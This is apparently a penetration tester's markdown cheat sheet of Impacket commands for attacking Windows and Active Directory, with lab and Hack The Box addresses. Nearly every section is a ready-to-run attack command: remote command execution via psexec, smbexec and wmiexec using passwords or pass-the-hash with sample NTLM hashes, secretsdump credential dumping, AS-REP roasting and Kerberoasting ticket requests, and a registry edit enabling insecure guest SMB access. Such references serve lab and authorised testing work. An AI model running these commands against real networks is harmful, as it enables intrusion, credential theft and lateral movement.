# Impacket Tools

## Impacket SMBServer
```
$sudo python3 impacket-smbserver -u <username> -p <password> <name of share> <location of share>
$sudo python3 impacket-smbserver -smb2support -u <username> -p <password> <name of share> <location of share>
$sudo impacket-smbserver -smb2support <name of share> `pwd`
$sudo python3 smbserver.py -smb2support files $(pwd) -username test -password test

Sample Usage: $python3 impacket-smbserver -u myusername -p secretpassword myshare $(pwd)
Tip: use $(pwd) for the current working  directory
```

 ## Map Drive from CLI
 ```
 net use f: \\10.10.14.49\files /user:ph0enix password123
 net use M: \\ip-address\share /Persistent:Yes
 ```

## PSExec
```
[Sample Usage] python3 psexec.py Administrator@10.10.10.10 (enter password when prompted)
[PWD Auth] python3 psexec.py hacklab.local/ADLab02:P@ssw0rd123@192.168.10.17
[PTH] psexec.py Administrator@192.168.10.17 -hashes "aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5"
[PTH] psexec.py INLANEFREIGHT.LOCAL/Administrator@172.16.5.5 -hashes "aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf"
```

## SMBExec
```
[Sample Usage] python3 smbexec.py Administrator@10.10.10.10 (enter password when prompted)
[PWD Auth] python3 smbexec.py hacklab.local/ADLab02:P@ssw0rd123@192.168.10.17
[PTH] python3 smbexec.py Administrator@192.168.10.17 -hashes "aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5"
```

## WMIExec
```
[Sample Usage] python3 wmiexec.py Administrator@10.10.10.10 (enter password when prompted)
[PWD Auth] python wmiexec.py hacklab.local/ADLab02:P@ssw0rd123@192.168.10.17
[PTH] python wmiexec.py Administrator@192.168.10.17 -hashes "aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5"
```

## MSSQLClient
```
$python3 mssqlclient.py -port 1433 -db volume -windows-auth <username>@<ip address>
```

## WMIExec
```
$python3 wmiexec.py <username@hostname>
$python3 wmiexec.py <username:password@hostname>
```

## LookupSID
```
$python3 lookupsid.py <domain/username@hostname>
$python3 lookupsid.py <domain/username:password@hostname>
```

## SecretsDumping
```
python secretsdump.py htb.local/Administrator@reel.htb.local (enter password when prompted)
```

## Windows 10 SMBShare Can Connect
[URL](https://www.youtube.com/watch?v=vyatMj1Z2NQ)
```
Regedit
Browse to: Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters
Create a DWORD 32bit key: AllowInsecureGuestAuth and set to 1 for on, 0 for off
```

## GetNPUSers (ASRepRoasting)
Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking
```
python GetNPUsers.py htb.local/ -no-pass -usersfile domain_users.txt -format hashcat
```

## Kerberoasting
Query Domain for any Kerberoastable Users
```
python GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.57.178
```

## Kerberoast (request ticket)
Request ticket for account
```
python GetUserSPNs.py ACTIVE.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.57.178 -request -outputfile user-spn.hash
```